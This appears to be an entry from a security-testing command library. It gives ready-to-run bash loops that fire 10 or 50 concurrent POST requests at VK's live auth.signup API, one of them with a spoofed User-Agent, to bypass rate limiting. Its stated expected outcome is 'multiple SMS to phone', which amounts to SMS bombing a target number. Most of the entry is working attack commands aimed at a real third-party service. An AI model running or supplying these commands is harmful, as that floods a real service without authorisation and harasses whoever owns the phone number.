---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  for i in {1..10}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d
  'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131'
  & done; wait
tags:
  - api-testing
  - flood-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:10.513Z'
verified: false
validated: true
submitted: true
---
# curl-mass-request-script

## Command

```bash
for i in {1..10}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131' & done; wait
```

## Description

This bash loop sends 10 concurrent POST requests to the auth.signup API to simulate a flood and test for rate limiting bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{1..10}` | Loop range for number of requests | No (adjustable) |
| `curl ...` | Individual API call as in basic test | Yes |
| `& done; wait` | Runs in background and waits for completion | Yes |

## Examples

### Basic Usage

```bash
for i in {1..10}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131' & done; wait
```

### Advanced Usage

```bash
for i in {1..50}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131' -H 'User-Agent: Mozilla/5.0' & done; wait
```

## Expected Output

Multiple JSON success responses; no throttling errors, multiple SMS to phone.

## Related

- [[Related Procedure|procedures/Identify-Rate-Limit-Bypass-in-Auth-Signup-API]]
